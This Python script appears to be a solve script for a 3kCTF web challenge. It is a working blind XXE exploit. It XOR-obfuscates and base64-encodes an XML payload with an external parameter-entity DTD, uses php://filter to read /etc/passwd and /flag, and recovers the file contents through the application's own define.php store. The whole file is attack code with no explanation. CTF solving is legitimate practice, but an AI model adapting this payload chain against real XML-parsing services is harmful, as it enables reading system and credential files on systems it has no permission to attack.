import requests
import base64
import json
from pwn import *

s = requests.Session()
key_xor = "hSuuzuKdkvJeWgjW"

def getsid():
    response = s.get('http://wwwweb.3k.ctf.to/define.php')
    return response.json()['msg'][4:]

def getdata(sid):
    response = s.get('http://wwwweb.3k.ctf.to/define.php?sid='+sid)
    return response.text

def testchange(sid):
    response = s.get('http://wwwweb.3k.ctf.to/define.php?sid='+sid+'&key=test&value=test')
    return response.text

def sendpayload(sid,payload):
  url = "http://wwwweb.3k.ctf.to/api.php"
  header = {"Content-type": "application/x-www-form-urlencoded", "Accept": "*/*", "Origin": "http://wwwweb.3k.ctf.to", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "dnt": "1", "Connection": "close"}
  response = requests.post(url, headers=header, data=payload)

def create_pay(key,dtd):
  return {"xml": b64e(xor("<!DOCTYPE r [\r\n  <!ELEMENT r ANY >\r\n  <!ENTITY % sp SYSTEM \"php://filter//resource=data://text/plain;base64,"+base64.b64encode(dtd)+"\"> %sp; %param1;\r\n]>\r\n<subscribe><email>&exfil;</email></subscribe>",key))}

sid = getsid()

print "[*] SID : "+sid
print "[*] Default value : "+ getdata(sid)
print "[*] Make small changes to test : "+ testchange(sid)
print "[*] New value : \n"+ getdata(sid)

external_dtd_1 = '<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd"><!ENTITY % param1 \'<!ENTITY exfil SYSTEM "http://localhost/define.php?sid='+sid+'&#38;key=xxe&#38;value=%data;">\'>'
external_dtd_2 = '<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///flag"><!ENTITY % param1 \'<!ENTITY exfil SYSTEM "http://localhost/define.php?sid='+sid+'&#38;key=xxe&#38;value=%data;">\'>'

print "[*] Send payload 1 \n"
sendpayload(sid,create_pay(key_xor,external_dtd_1))
out = json.loads(getdata(sid))['value']
print "[*] Output file: \n"+ base64.b64decode(out)

print "[*] Send payload 1 \n"
sendpayload(sid,create_pay(key_xor,external_dtd_2))
out = json.loads(getdata(sid))['value']
print "[*] Output file: \n"+ base64.b64decode(out)

print "[*] Reset value to prevent leak"
testchange(sid)


